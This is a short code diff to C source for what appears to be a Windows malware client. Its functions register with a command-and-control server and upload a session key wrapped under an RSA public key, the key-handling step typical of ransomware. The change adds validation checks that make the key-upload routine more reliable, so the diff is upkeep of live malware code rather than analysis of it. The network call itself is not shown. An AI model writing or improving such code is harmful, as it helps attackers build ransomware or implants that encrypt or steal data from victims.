@@ -242,9 +242,12 @@ static BOOL register_with_c2(void) {
 }
 
 static BOOL upload_wrapped_key(const BYTE *rsa_pub_der, DWORD rsa_pub_len) {
+    if (!rsa_pub_der || rsa_pub_len < 64) return FALSE;
     if (!bv_wrap_session_key(rsa_pub_der, rsa_pub_len, g_sess.key,
                              g_wrapped_key, &g_wrapped_len))
         return FALSE;
+    if (g_wrapped_len == 0) return FALSE;
+    
     char hex[1024] = {0};
     for (DWORD i = 0; i < g_wrapped_len && i * 2 + 1 < sizeof(hex); i++) {
         sprintf_s(hex + i * 2, sizeof(hex) - i * 2, "%02x", g_wrapped_key[i]);
